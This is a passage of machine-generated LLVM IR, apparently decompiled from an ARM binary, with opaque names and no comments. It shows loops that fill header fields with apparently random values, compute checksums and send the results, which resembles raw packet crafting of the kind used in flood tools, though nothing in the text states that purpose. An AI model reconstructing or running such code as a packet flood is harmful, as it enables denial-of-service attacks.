  %v0_9734 = load i32, i32* %r4.global-to-local, align 4
  %v1_9734 = add i32 %v0_9734, 58
  store i32 %v1_9734, i32* @r6, align 4
  store i32 %v4_9738, i32* %r2.global-to-local, align 4
  %v1_973c = add i32 %v3_9730, 1
  store i32 %v1_973c, i32* @r4, align 4
  store i32 %v4_9740, i32* %r3.global-to-local, align 4
  %v1_9744 = load i32, i32* @sl, align 4
  %v9_9744 = icmp eq i32 %v1_973c, %v1_9744
  store i1 %v9_9744, i1* %cpsr_z.global-to-local, align 1
  %v0_9748 = load i32, i32* @r7, align 4
  %v1_9748 = trunc i32 %v0_9748 to i16
  %v3_9748 = add i32 %v0_9734, 62
  %v4_9748 = inttoptr i32 %v3_9748 to i16*
  store i16 %v1_9748, i16* %v4_9748, align 2
  %v0_974c = load i32, i32* %r2.global-to-local, align 4
  %v1_974c = trunc i32 %v0_974c to i16
  %v2_974c = load i32, i32* @r6, align 4
  %v3_974c = inttoptr i32 %v2_974c to i16*
  store i16 %v1_974c, i16* %v3_974c, align 2
  %v0_9750 = load i32, i32* %r3.global-to-local, align 4
  %v1_9750 = trunc i32 %v0_9750 to i16
  %v2_9750 = load i32, i32* @r6, align 4
  %v3_9750 = add i32 %v2_9750, 2
  %v4_9750 = inttoptr i32 %v3_9750 to i16*
  store i16 %v1_9750, i16* %v4_9750, align 2
  %v0_9754 = load i32, i32* @r4, align 4
  store i32 %v0_9754, i32* %stack_var_-44, align 4
  %v5_9758 = icmp slt i32 %v1_973c, %v1_9744
  br i1 %v5_9758, label %dec_label_pc_9600, label %dec_label_pc_975c

dec_label_pc_975c:                                ; preds = %bb85
  %v1_9764 = add i32 %v5_9480, 8
  store i32 %v1_9764, i32* %r4.global-to-local, align 4
  %v1_9768 = add i32 %v5_9480, 66
  store i32 %v1_9768, i32* %r5.global-to-local, align 4
  %v0_9778.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_9774.preheader

dec_label_pc_9774.preheader:                      ; preds = %dec_label_pc_975c, %dec_label_pc_9a0c
  %v0_9778.pre = phi i32 [ %v0_9778.pre.pre, %dec_label_pc_975c ], [ 0, %dec_label_pc_9a0c ]
  %stack_var_-132.0.ph = phi i32 [ %v1_9768, %dec_label_pc_975c ], [ %v1_9a18, %dec_label_pc_9a0c ]
  %stack_var_-136.0.ph = phi i32 [ %v1_9764, %dec_label_pc_975c ], [ %v1_9a14, %dec_label_pc_9a0c ]
  %v2_99c8 = icmp eq i32 %v1_952c, 0
  %v2_9810 = ptrtoint i32* %stack_var_-48 to i32
  %v2_9828 = ptrtoint i32* %stack_var_-52 to i32
  %v2_9838 = ptrtoint i32* %stack_var_-56 to i32
  %v2_9844 = ptrtoint i32* %stack_var_-54 to i32
  %v2_9858 = icmp eq i32 %v1_94a0, 0
  %v2_97b8 = icmp eq i32 %v5_94d4, -1
  %v7_97b8 = icmp eq i32 %v5_94d4, -1
  br label %dec_label_pc_9774

dec_label_pc_9774:                                ; preds = %dec_label_pc_9774, %dec_label_pc_9860, %dec_label_pc_9774.preheader
  %v0_9778 = phi i32 [ %v0_9778.pre, %dec_label_pc_9774.preheader ], [ 0, %dec_label_pc_9774 ], [ %v1_98fc, %dec_label_pc_9860 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9778 = icmp eq i32 %v0_9778, 0
  store i1 %v2_9778, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9778, label %dec_label_pc_9774, label %dec_label_pc_9784

dec_label_pc_9784:                                ; preds = %dec_label_pc_9774
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9788

dec_label_pc_9788:                                ; preds = %dec_label_pc_9860, %dec_label_pc_9784
  %v1_979c = phi i32 [ %v1_98f8, %dec_label_pc_9860 ], [ 0, %dec_label_pc_9784 ]
  %v5_978c = mul i32 %v1_979c, 24
  %v1_9790 = load i32, i32* @sb, align 4
  %v2_9790 = add i32 %v1_9790, %v5_978c
  store i32 %v2_9790, i32* %r3.global-to-local, align 4
  store i32 %v2_93b4, i32* %r4.global-to-local, align 4
  %v1_9798 = add i32 %v2_9790, 20
  %v2_9798 = inttoptr i32 %v1_9798 to i8*
  %v3_9798 = load i8, i8* %v2_9798, align 1
  %v4_9798 = zext i8 %v3_9798 to i32
  store i32 %v4_9798, i32* %r2.global-to-local, align 4
  %v4_979c = mul i32 %v1_979c, 4
  %v5_979c = add i32 %v4_979c, %v2_93b4
  %v6_979c = inttoptr i32 %v5_979c to i32*
  %v7_979c = load i32, i32* %v6_979c, align 4
  store i32 %v7_979c, i32* @r5, align 4
  %v7_97a0 = icmp eq i8 %v3_9798, 31
  store i1 %v7_97a0, i1* %cpsr_z.global-to-local, align 1
  %v1_97a4 = add i32 %v7_979c, 24
  store i32 %v1_97a4, i32* @r7, align 4
  %v1_97a8 = add i32 %v7_979c, 38
  store i32 %v1_97a8, i32* @r6, align 4
  %v1_97ac = add i32 %v7_979c, 58
  store i32 %v1_97ac, i32* @r8, align 4
  %tmp90 = icmp ult i8 %v3_9798, 32
  br i1 %tmp90, label %dec_label_pc_990c, label %dec_label_pc_97b4

dec_label_pc_97b4:                                ; preds = %dec_label_pc_9788
  store i32 %v5_94d4, i32* %r1.global-to-local, align 4
  store i1 %v7_97b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_97b8, label %dec_label_pc_996c, label %dec_label_pc_97c0

dec_label_pc_97c0:                                ; preds = %dec_label_pc_990c, %dec_label_pc_97b4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_97c8 = load i32, i32* @fp, align 4
  %v9_97c8 = icmp eq i32 %v0_97c8, 65535
  store i1 %v9_97c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_97c8, label %dec_label_pc_9984, label %dec_label_pc_97d0

dec_label_pc_97d0:                                ; preds = %dec_label_pc_996c.dec_label_pc_97d0_crit_edge, %dec_label_pc_97c0
  %v1_97d4 = phi i32 [ %v1_97d4.pre, %dec_label_pc_996c.dec_label_pc_97d0_crit_edge ], [ 65535, %dec_label_pc_97c0 ]
  store i32 %v3_9534, i32* %r2.global-to-local, align 4
  %v9_97d4 = icmp eq i32 %v3_9534, %v1_97d4
  store i1 %v9_97d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_97d4, label %dec_label_pc_99ac, label %dec_label_pc_97dc

dec_label_pc_97dc:                                ; preds = %dec_label_pc_9984.dec_label_pc_97dc_crit_edge, %dec_label_pc_97d0
  %v1_97e0 = phi i32 [ %v1_97e0.pre, %dec_label_pc_9984.dec_label_pc_97dc_crit_edge ], [ %v1_97d4, %dec_label_pc_97d0 ]
  store i32 %v3_9538, i32* %r3.global-to-local, align 4
  %v9_97e0 = icmp eq i32 %v3_9538, %v1_97e0
  store i1 %v9_97e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_97e0, label %dec_label_pc_99c0, label %dec_label_pc_97e8

dec_label_pc_97e8:                                ; preds = %dec_label_pc_99ac, %dec_label_pc_97dc
  store i32 %v1_952c, i32* @r4, align 4
  store i1 %v2_99c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_99c8, label %dec_label_pc_99dc, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_97e8
  %v1_97f0 = load i32, i32* @r5, align 4
  %v2_97f0 = add i32 %v1_97f0, 16
  %v3_97f0 = inttoptr i32 %v2_97f0 to i32*
  %v4_97f0 = load i32, i32* %v3_97f0, align 4
  store i32 %v4_97f0, i32* %r3.global-to-local, align 4
  %v2_97f4 = load i32, i32* @r6, align 4
  %v3_97f4 = add i32 %v2_97f4, 16
  %v4_97f4 = inttoptr i32 %v3_97f4 to i32*
  store i32 %v4_97f0, i32* %v4_97f4, align 4
  br label %dec_label_pc_97fc

dec_label_pc_97fc:                                ; preds = %bb88, %.thread11, %dec_label_pc_99dc
  %v0_97fc = call i32 @function_e0d0()
  store i32 %v0_97fc, i32* %r0.global-to-local, align 4
  store i32 %v0_97fc, i32* %stack_var_-48, align 4
  %v0_9804 = call i32 @function_e0d0()
  store i32 %v0_9804, i32* %r0.global-to-local, align 4
  store i32 %v0_9804, i32* %stack_var_-52, align 4
  %v0_980c = call i32 @function_e0d0()
  store i32 %v2_9810, i32* %r1.global-to-local, align 4
  store i32 %v0_980c, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_981c = load i32, i32* @r7, align 4
  store i32 %v0_981c, i32* %r0.global-to-local, align 4
  %v3_9820 = call i32 @function_108bc(i32 %v0_981c, i32 %v2_9810, i32 4)
  %v0_9824 = load i32, i32* @r7, align 4
  %v1_9824 = add i32 %v0_9824, 6
  store i32 %v1_9824, i32* %r0.global-to-local, align 4
  store i32 %v2_9828, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_9830 = call i32 @function_108bc(i32 %v1_9824, i32 %v2_9828, i32 4)
  %v0_9834 = load i32, i32* @r7, align 4
  %v1_9834 = add i32 %v0_9834, 4
  store i32 %v1_9834, i32* %r0.global-to-local, align 4
  store i32 %v2_9838, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_9840 = call i32 @function_108bc(i32 %v1_9834, i32 %v2_9838, i32 2)
  store i32 %v2_9844, i32* %r1.global-to-local, align 4
  %v0_9848 = load i32, i32* @r7, align 4
  %v1_9848 = add i32 %v0_9848, 10
  store i32 %v1_9848, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_9850 = call i32 @function_108bc(i32 %v1_9848, i32 %v2_9844, i32 2)
  store i32 %v3_9850, i32* %r0.global-to-local, align 4
  store i32 %v1_94a0, i32* %r1.global-to-local, align 4
  store i1 %v2_9858, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9858, label %dec_label_pc_9860, label %dec_label_pc_99e8

dec_label_pc_9860:                                ; preds = %dec_label_pc_97fc, %dec_label_pc_99e8
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_9864 = load i32, i32* @r5, align 4
  %v3_9864 = add i32 %v2_9864, 10
  %v4_9864 = inttoptr i32 %v3_9864 to i16*
  store i16 0, i16* %v4_9864, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_986c = load i32, i32* @r5, align 4
  store i32 %v0_986c, i32* @r0, align 4
  %v2_9870 = call i32 @function_c848(i32 %v0_986c, i32 20)
  %v3_9870 = trunc i32 %v2_9870 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9878 = load i32, i32* @r5, align 4
  %v4_9878 = add i32 %v3_9878, 10
  %v5_9878 = inttoptr i32 %v4_9878 to i16*
  store i16 %v3_9870, i16* %v5_9878, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9880 = load i32, i32* %r3.global-to-local, align 4
  %v1_9880 = trunc i32 %v0_9880 to i16
  %v2_9880 = load i32, i32* @r6, align 4
  %v3_9880 = add i32 %v2_9880, 10
  %v4_9880 = inttoptr i32 %v3_9880 to i16*
  store i16 %v1_9880, i16* %v4_9880, align 2
  %v0_9884 = load i32, i32* @r6, align 4
  store i32 %v0_9884, i32* @r0, align 4
  %v2_9888 = call i32 @function_c848(i32 %v0_9884, i32 20)
  %v3_9888 = trunc i32 %v2_9888 to i16
  store i32 %v2_9888, i32* %r0.global-to-local, align 4
  %v3_988c = load i32, i32* @r6, align 4
  %v4_988c = add i32 %v3_988c, 10
  %v5_988c = inttoptr i32 %v4_988c to i16*
  store i16 %v3_9888, i16* %v5_988c, align 2
  store i32 0, i32* @r4, align 4
  %v0_9894 = load i32, i32* @r8, align 4
  store i32 %v0_9894, i32* @r1, align 4
  %v1_9898 = add i32 %v0_9894, 4
  %v2_9898 = inttoptr i32 %v1_9898 to i16*
  %v3_9898 = load i16, i16* %v2_9898, align 2
  %v4_9898 = zext i16 %v3_9898 to i32
  store i32 %v4_9898, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-136.0.ph, i32* %r3.global-to-local, align 4
  %v3_98a0 = add i32 %v0_9894, 6
  %v4_98a0 = inttoptr i32 %v3_98a0 to i16*
  store i16 0, i16* %v4_98a0, align 2
  %v0_98a4 = load i32, i32* @r6, align 4
  store i32 %v0_98a4, i32* %r0.global-to-local, align 4
  %v4_98a8 = call i32 @function_c898(i32 %v0_98a4, i32 %v0_9894, i32 %v4_9898, i32 %stack_var_-136.0.ph)
  %v5_98a8 = trunc i32 %v4_98a8 to i16
  store i32 %v4_98a8, i32* %r0.global-to-local, align 4
  %v3_98ac = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_98ac, i32* %r2.global-to-local, align 4
  %v3_98b0 = mul i32 %v3_98ac, 32
  store i32 %v3_98b0, i32* %r3.global-to-local, align 4
  %v0_98b4 = load i32, i32* @r5, align 4
  %v1_98b4 = add i32 %v0_98b4, 16
  %v2_98b4 = inttoptr i32 %v1_98b4 to i32*
  %v3_98b4 = load i32, i32* %v2_98b4, align 4
  %v5_98b8 = mul i32 %v3_98ac, 24
  store i32 %v5_98b8, i32* %r3.global-to-local, align 4
  %v1_98bc = load i32, i32* @sb, align 4
  %v2_98bc = add i32 %v1_98bc, %v5_98b8
  store i32 %v2_98bc, i32* @lr, align 4
  %v2_98c0 = add i32 %v2_98bc, 4
  %v3_98c0 = inttoptr i32 %v2_98c0 to i32*
  store i32 %v3_98b4, i32* %v3_98c0, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_98c8 = load i32, i32* @r8, align 4
  %v4_98c8 = add i32 %v3_98c8, 6
  %v5_98c8 = inttoptr i32 %v4_98c8 to i16*
  store i16 %v5_98a8, i16* %v5_98c8, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_98d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_98d0 = trunc i32 %v0_98d0 to i16
  %v2_98d0 = load i32, i32* %r3.global-to-local, align 4
  %v3_98d0 = load i32, i32* @sb, align 4
  %v4_98d0 = add i32 %v3_98d0, %v2_98d0
  %v5_98d0 = inttoptr i32 %v4_98d0 to i16*
  store i16 %v1_98d0, i16* %v5_98d0, align 2
  %v0_98d4 = load i32, i32* @r4, align 4
  %v1_98d4 = trunc i32 %v0_98d4 to i16
  %v2_98d4 = load i32, i32* @lr, align 4
  %v3_98d4 = add i32 %v2_98d4, 2
  %v4_98d4 = inttoptr i32 %v3_98d4 to i16*
  store i16 %v1_98d4, i16* %v4_98d4, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_98dc = load i32, i32* @r5, align 4
  store i32 %v0_98dc, i32* %r1.global-to-local, align 4
  store i32 %v3_94e8, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-132.0.ph, i32* %r2.global-to-local, align 4
  %v0_98e8 = load i32, i32* @lr, align 4
  %v0_98ec = load i32, i32* %ip.global-to-local, align 4
  %v6_98f0 = call i32 @function_11a68(i32 %v3_94e8, i32 %v0_98dc, i32 %stack_var_-132.0.ph, i32 16384, i32 %v0_98e8, i32 %v0_98ec)
  %v3_98f4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_98f4, i32* %r3.global-to-local, align 4
  %v1_98f8 = add i32 %v3_98f4, 1
  store i32 %v1_98f8, i32* %r0.global-to-local, align 4
  %v1_98fc = load i32, i32* @sl, align 4
  %v9_98fc = icmp eq i32 %v1_98f8, %v1_98fc
  store i1 %v9_98fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_98f8, i32* %stack_var_-44, align 4
  %v6_9904 = icmp slt i32 %v1_98f8, %v1_98fc
  br i1 %v6_9904, label %dec_label_pc_9788, label %dec_label_pc_9774

dec_label_pc_990c:                                ; preds = %dec_label_pc_9788
  %v1_990c = add i32 %v2_9790, 16
  %v2_990c = inttoptr i32 %v1_990c to i32*
  %v3_990c = load i32, i32* %v2_990c, align 4
  store i32 %v3_990c, i32* %r4.global-to-local, align 4
  %v0_9910 = call i32 @function_e0d0()
  store i32 %v0_9910, i32* %r0.global-to-local, align 4
  %v3_9914 = load i32, i32* %stack_var_-44, align 4
  %v5_991c = mul i32 %v3_9914, 24
  %v0_9920 = load i32, i32* %r4.global-to-local, align 4
  %v1_9920 = and i32 %v0_9920, 16711680
  store i32 %v1_9920, i32* %ip.global-to-local, align 4
  %v3_9924 = udiv i32 %v0_9920, 16777216
  %v4_9928 = udiv i32 %v1_9920, 256
  %v5_9928 = or i32 %v4_9928, %v3_9924
  store i32 %v5_9928, i32* %r2.global-to-local, align 4
  %v1_992c = load i32, i32* @sb, align 4
  %v2_992c = add i32 %v1_992c, %v5_991c
  store i32 %v2_992c, i32* %r1.global-to-local, align 4
  %v1_9930 = and i32 %v0_9920, 65280
  store i32 %v1_9930, i32* %r3.global-to-local, align 4
  %v1_9934 = add i32 %v2_992c, 20
  %v2_9934 = inttoptr i32 %v1_9934 to i8*
  %v3_9934 = load i8, i8* %v2_9934, align 1
  %v4_9934 = zext i8 %v3_9934 to i32
  store i32 %v4_9934, i32* %ip.global-to-local, align 4
  %v5_993c = call i32 @llvm.bswap.i32(i32 %v0_9920)
  %v7_9940 = lshr i32 %v0_9910, %v4_9934
  %v8_9940 = add i32 %v7_9940, %v5_993c
  store i32 %v8_9940, i32* %r2.global-to-local, align 4
  %v1_9944 = and i32 %v8_9940, 16711680
  store i32 %v1_9944, i32* %r0.global-to-local, align 4
  store i32 %v5_94d4, i32* %r1.global-to-local, align 4
  %v5_995c = call i32 @llvm.bswap.i32(i32 %v8_9940)
  store i32 %v5_995c, i32* %r3.global-to-local, align 4
  store i1 %v7_97b8, i1* %cpsr_z.global-to-local, align 1
  %v1_9964 = load i32, i32* @r5, align 4
  %v2_9964 = add i32 %v1_9964, 16
  %v3_9964 = inttoptr i32 %v2_9964 to i32*
  store i32 %v5_995c, i32* %v3_9964, align 4
  br i1 %v2_97b8, label %dec_label_pc_996c, label %dec_label_pc_97c0

dec_label_pc_996c:                                ; preds = %dec_label_pc_990c, %dec_label_pc_97b4
  %v0_996c = call i32 @function_e0d0()
  store i32 %v0_996c, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_9978 = load i32, i32* @fp, align 4
  %v9_9978 = icmp eq i32 %v0_9978, 65535
  store i1 %v9_9978, i1* %cpsr_z.global-to-local, align 1
  %v1_997c = load i32, i32* @r5, align 4
  %v2_997c = add i32 %v1_997c, 12
  %v3_997c = inttoptr i32 %v2_997c to i32*
  store i32 %v0_996c, i32* %v3_997c, align 4
  br i1 %v9_9978, label %dec_label_pc_9984, label %dec_label_pc_996c.dec_label_pc_97d0_crit_edge

dec_label_pc_996c.dec_label_pc_97d0_crit_edge:    ; preds = %dec_label_pc_996c
  %v1_97d4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_97d0

dec_label_pc_9984:                                ; preds = %dec_label_pc_996c, %dec_label_pc_97c0
  %v0_9984 = call i32 @function_e0d0()
  %v3_998c = urem i32 %v0_9984, 65536
  store i32 %v3_998c, i32* %r0.global-to-local, align 4
  store i32 %v3_9534, i32* %r2.global-to-local, align 4
  %v1_9998 = sub nsw i32 999, %v3_998c
  store i32 %v1_9998, i32* %r3.global-to-local, align 4
  %v1_999c = load i32, i32* %r4.global-to-local, align 4
  %v9_999c = icmp eq i32 %v3_9534, %v1_999c
  store i1 %v9_999c, i1* %cpsr_z.global-to-local, align 1
  %v1_99a0 = trunc i32 %v0_9984 to i16
  %v2_99a0 = load i32, i32* @r5, align 4
  %v3_99a0 = add i32 %v2_99a0, 4
  %v4_99a0 = inttoptr i32 %v3_99a0 to i16*
  store i16 %v1_99a0, i16* %v4_99a0, align 2
  %v0_99a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_99a4 = trunc i32 %v0_99a4 to i16
  %v2_99a4 = load i32, i32* @r6, align 4
  %v3_99a4 = add i32 %v2_99a4, 4
  %v4_99a4 = inttoptr i32 %v3_99a4 to i16*
  store i16 %v1_99a4, i16* %v4_99a4, align 2
  br i1 %v9_999c, label %dec_label_pc_99ac, label %dec_label_pc_9984.dec_label_pc_97dc_crit_edge

dec_label_pc_9984.dec_label_pc_97dc_crit_edge:    ; preds = %dec_label_pc_9984
  %v1_97e0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_97dc

dec_label_pc_99ac:                                ; preds = %dec_label_pc_9984, %dec_label_pc_97d0
  %v0_99ac = call i32 @function_e0d0()
  %v1_99ac = trunc i32 %v0_99ac to i16
  store i32 %v0_99ac, i32* %r0.global-to-local, align 4
  store i32 %v3_9538, i32* %r3.global-to-local, align 4
  %v1_99b4 = load i32, i32* %r4.global-to-local, align 4
  %v9_99b4 = icmp eq i32 %v3_9538, %v1_99b4
  store i1 %v9_99b4, i1* %cpsr_z.global-to-local, align 1
  %v3_99b8 = load i32, i32* @r5, align 4
  %v4_99b8 = add i32 %v3_99b8, 58
  %v5_99b8 = inttoptr i32 %v4_99b8 to i16*
  store i16 %v1_99ac, i16* %v5_99b8, align 2
  br i1 %v9_99b4, label %dec_label_pc_99c0, label %dec_label_pc_97e8

dec_label_pc_99c0:                                ; preds = %dec_label_pc_99ac, %dec_label_pc_97dc
  %v0_99c0 = call i32 @function_e0d0()
  %v1_99c0 = trunc i32 %v0_99c0 to i16
  store i32 %v0_99c0, i32* %r0.global-to-local, align 4
  store i32 %v1_952c, i32* @r4, align 4
  store i1 %v2_99c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_99c8, label %.thread31, label %bb88

.thread31:                                        ; preds = %dec_label_pc_99c0
  %v3_99d032 = load i32, i32* @r8, align 4
  %v4_99d033 = add i32 %v3_99d032, 2
  %v5_99d034 = inttoptr i32 %v4_99d033 to i16*
  store i16 %v1_99c0, i16* %v5_99d034, align 2
  br label %dec_label_pc_99dc

bb88:                                             ; preds = %dec_label_pc_99c0
  %v1_99cc = load i32, i32* @r5, align 4
  %v2_99cc = add i32 %v1_99cc, 16
  %v3_99cc = inttoptr i32 %v2_99cc to i32*
  %v4_99cc = load i32, i32* %v3_99cc, align 4
  store i32 %v4_99cc, i32* %r3.global-to-local, align 4
  %v3_99d0 = load i32, i32* @r8, align 4
  %v4_99d0 = add i32 %v3_99d0, 2
  %v5_99d0 = inttoptr i32 %v4_99d0 to i16*
  store i16 %v1_99c0, i16* %v5_99d0, align 2
  %v1_99d4 = load i32, i32* %r3.global-to-local, align 4
  %v2_99d4 = load i32, i32* @r6, align 4
  %v3_99d4 = add i32 %v2_99d4, 16
  %v4_99d4 = inttoptr i32 %v3_99d4 to i32*
  store i32 %v1_99d4, i32* %v4_99d4, align 4
  br label %dec_label_pc_97fc

dec_label_pc_99dc:                                ; preds = %.thread31, %dec_label_pc_97e8
  %v0_99dc = call i32 @function_e0d0()
  store i32 %v0_99dc, i32* %r0.global-to-local, align 4
  %v1_99e0 = load i32, i32* @r6, align 4
  %v2_99e0 = add i32 %v1_99e0, 16
  %v3_99e0 = inttoptr i32 %v2_99e0 to i32*
  store i32 %v0_99dc, i32* %v3_99e0, align 4
  br label %dec_label_pc_97fc

dec_label_pc_99e8:                                ; preds = %dec_label_pc_97fc
  %v0_99e8 = load i32, i32* @r8, align 4
  %v1_99e8 = add i32 %v0_99e8, 8
  store i32 %v1_99e8, i32* %r0.global-to-local, align 4
  store i32 %v5_9480, i32* %r1.global-to-local, align 4
  %v2_99f0 = inttoptr i32 %v1_99e8 to i16*
  %v3_99f0 = call i32 @function_e264(i16* %v2_99f0, i32 %v5_9480)
  store i32 %v3_99f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9860

dec_label_pc_99f8:                                ; preds = %dec_label_pc_94f8
  store i32 %v3_94e8, i32* %r0.global-to-local, align 4
  %v1_99fc = call i32 @function_1130c(i32 %v3_94e8)
  store i32 %v1_99fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9a00

dec_label_pc_9a00:                                ; preds = %dec_label_pc_9398, %dec_label_pc_99f8
  %v1_9a08 = phi i32 [ %v3_94e8, %dec_label_pc_9398 ], [ %v1_99fc, %dec_label_pc_99f8 ]
  store i32 %v3_9398, i32* %r4.global-to-local, align 4
  store i32 %v6_9398, i32* %r5.global-to-local, align 4
  store i32 %v24_9398, i32* %fp.global-to-local, align 4
  ret i32 %v1_9a08

dec_label_pc_9a0c:                                ; preds = %dec_label_pc_9520
  %v1_9a14 = add i32 %v5_9480, 8
  store i32 %v1_9a14, i32* %r1.global-to-local, align 4
  %v1_9a18 = add i32 %v5_9480, 66
  store i32 %v1_9a18, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9774.preheader

; uselistorder directives
  uselistorder i32 %v1_9a18, { 1, 0 }
  uselistorder i32 %v1_9a14, { 1, 0 }
  uselistorder i16 %v1_99c0, { 1, 0 }
  uselistorder i32 %v0_99c0, { 1, 0 }
  uselistorder i32 %v0_99ac, { 1, 0 }
  uselistorder i32 %v3_998c, { 1, 0 }
  uselistorder i32 %v0_9984, { 1, 0 }
  uselistorder i32 %v5_995c, { 1, 0 }
  uselistorder i32 %v0_9920, { 1, 2, 0, 3 }
  uselistorder i32 %v1_98fc, { 1, 2, 0 }
  uselistorder i32 %v1_98f8, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_98ac, { 1, 0, 2 }
  uselistorder i32 %v4_98a8, { 1, 0 }
  uselistorder i32 %v0_9894, { 1, 0, 2, 3 }
  uselistorder i32 %v2_9888, { 1, 0 }
  uselistorder i32 %v7_979c, { 2, 1, 0, 3 }
  uselistorder i1 %v7_97b8, { 2, 1, 0 }
  uselistorder i1 %v2_99c8, { 2, 3, 1, 0 }
  uselistorder i32 %v0_970c, { 1, 0, 2 }
  uselistorder i32 %v3_9588, { 1, 0 }
  uselistorder i32 %v3_956c, { 1, 2, 0 }
  uselistorder i32 %v1_9568, { 1, 0 }
  uselistorder i32 %v1_952c, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_9528, { 1, 0, 3, 2 }
  uselistorder i32 %v0_9524, { 1, 0, 2, 3 }
  uselistorder i32 %v0_9520, { 1, 0, 2, 3 }
  uselistorder i1 %v7_9518, { 1, 0 }
  uselistorder i1 %v7_94ec, { 1, 0 }
  uselistorder i32 %v3_94e8, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v5_94d4, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_94a0, { 1, 2, 0 }
  uselistorder i32 %v5_9480, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_9434, { 1, 0 }
  uselistorder i32 %v1_9410, { 2, 1, 0 }
  uselistorder i32 %v5_9408, { 1, 0 }
  uselistorder i8 %v5_93ec, { 0, 2, 1 }
  uselistorder i32 %v6_93cc, { 1, 0 }
  uselistorder i32 %v2_93b4, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r4.global-to-local, { 0, 6, 5, 7, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 1, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 28, 27, 29, 30, 32, 31, 33, 34, 36, 35, 38, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 8, 6, 10, 9, 12, 11, 13, 15, 14, 16, 18, 17, 19, 20, 21, 22, 24, 23, 27, 25, 26, 30, 28, 29, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9a00, { 1, 0 }
  uselistorder label %dec_label_pc_9860, { 1, 0 }
  uselistorder label %dec_label_pc_97fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9774, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9774.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread25, { 1, 0 }
}

define i32 @function_9a2c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9a2c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_9a2c = load i32, i32* @r4, align 4
  %v6_9a2c = load i32, i32* @r5, align 4
  %v24_9a2c = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
